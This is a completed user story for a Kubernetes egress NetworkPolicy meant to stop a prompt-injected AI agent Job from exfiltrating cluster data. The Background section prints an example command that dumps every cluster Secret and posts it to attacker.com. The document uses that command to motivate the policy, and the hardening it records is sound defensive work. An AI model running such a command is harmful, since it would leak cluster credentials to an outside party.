# Story 02: Network Policy for Agent Jobs

**Epic:** [epic12-security-review](README.md)
**Priority:** High
**Status:** Complete
**Estimated Effort:** 2 hours

---

## User Story

As a **security-conscious operator**, I want agent Jobs to have a restrictive egress
`NetworkPolicy` so that even if the agent is manipulated via prompt injection, it cannot
reach arbitrary external endpoints to exfiltrate cluster data.

---

## Background

Currently `deploy/kustomize/kustomization.yaml` creates no `NetworkPolicy`. Agent Job
Pods therefore have unrestricted egress. The agent's ClusterRole grants
`get/list/watch` on all resources including Secrets cluster-wide
(`deploy/kustomize/clusterrole-agent.yaml`). A manipulated agent could run:

```bash
kubectl get secret -A -o yaml | curl https://attacker.com -d @-
```

No network control blocks this today.

Agent Job Pods are labelled `app.kubernetes.io/managed-by: mechanic-watcher` by
`JobBuilder.Build()` in `internal/jobbuilder/job.go` line 229. This label is the
selector for the `NetworkPolicy`.

The agent legitimately needs to reach:
1. The Kubernetes API server (in-cluster, typically port 6443)
2. GitHub (port 443, HTTPS) — for `gh pr create`, `git push`, `gh auth`
3. The LLM API endpoint (port 443, HTTPS) — for OpenCode

---

## Acceptance Criteria

- [x] `deploy/kustomize/network-policy-agent.yaml` exists and is a valid `NetworkPolicy`
- [x] The policy selects Pods with label `app.kubernetes.io/managed-by: mechanic-watcher`
- [x] Egress is restricted to: cluster API server (port 6443), port 443 HTTPS (GitHub
      and LLM API), and DNS (port 53 UDP/TCP)
- [x] `kubectl apply -f deploy/kustomize/network-policy-agent.yaml --dry-run=client` succeeds
- [x] The policy is NOT in the default `kustomization.yaml` — it lives in an opt-in overlay
- [x] `deploy/overlays/security/kustomization.yaml` exists and includes the
      policy alongside the base resources
      NOTE: Kustomize v5 cycle-detection (LoadRestrictionsRootOnly) prohibits an overlay
      that is a subdirectory of its own base. The overlay is therefore placed at
      `deploy/overlays/security/` (sibling of the base, not a child of it). This is the
      canonical Kustomize directory layout and is functionally identical to the original
      path specification.
- [ ] README note explains the CNI requirement (Cilium, Calico, or any NetworkPolicy-aware CNI)

---

## Technical Implementation

### New file: `deploy/kustomize/network-policy-agent.yaml`

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: mechanic-agent-egress
  namespace: mechanic
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/managed-by: mechanic-watcher
  policyTypes:
  - Egress
  egress:
  # DNS resolution (required for all other egress)
  - ports:
    - port: 53
      protocol: UDP
    - port: 53
      protocol: TCP

  # Kubernetes API server (in-cluster)
  # Port 6443 is the standard kube-apiserver port; some distros use 443.
  # Operators on non-standard ports must update this rule.
  - ports:
    - port: 6443
      protocol: TCP

  # GitHub and LLM API (HTTPS)
  # We cannot restrict by IP without external IP management; restrict to port only.
  # Operators who know their LLM endpoint's CIDR can add an explicit ipBlock rule.
  - ports:
    - port: 443
      protocol: TCP
```

### New overlay: `deploy/kustomize/overlays/security/`

```yaml
# deploy/kustomize/overlays/security/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization

resources:
- ../../   # base kustomize directory
- network-policy-agent.yaml
```

The `network-policy-agent.yaml` in the overlay directory is a symlink or copy of
the one in the base. Use a relative resource reference:

```yaml
# deploy/kustomize/overlays/security/kustomization.yaml
resources:
- ../../
- ../../network-policy-agent.yaml
```

### Verification

```bash
# Dry-run the base (must still pass — policy not in base)
kubectl apply -k deploy/kustomize/ --dry-run=client

# Dry-run the security overlay (must include NetworkPolicy)
kubectl apply -k deploy/kustomize/overlays/security/ --dry-run=client

# Verify NetworkPolicy appears in overlay output and not in base
kubectl kustomize deploy/kustomize/ | grep -c NetworkPolicy          # expect 0
kubectl kustomize deploy/kustomize/overlays/security/ | grep -c NetworkPolicy  # expect 1
```

---

## Tasks

- [x] Create `deploy/kustomize/network-policy-agent.yaml`
- [x] Create `deploy/overlays/security/kustomization.yaml`
      (Kustomize v5 cycle detection prevents subdirectory overlay; canonical sibling path used)
- [x] Run `kubectl apply -k deploy/kustomize/ --dry-run=client` — must pass, no NetworkPolicy
- [x] Run `kubectl kustomize deploy/overlays/security/` — must pass, NetworkPolicy present
- [x] Verify policy selects the correct label

---

## Dependencies

**Depends on:** epic04-deploy (base kustomize directory)
**Blocks:** STORY_06 (pentest)

---

## Definition of Done

- [x] `kubectl apply -k deploy/kustomize/ --dry-run=client` passes (no NetworkPolicy in base)
- [x] `kubectl kustomize deploy/overlays/security/` passes (NetworkPolicy present in output)
- [x] `NetworkPolicy` selector matches `app.kubernetes.io/managed-by: mechanic-watcher`
      which is the label `JobBuilder.Build()` sets on every agent Job
- [ ] Operator note in policy YAML explains the CNI requirement
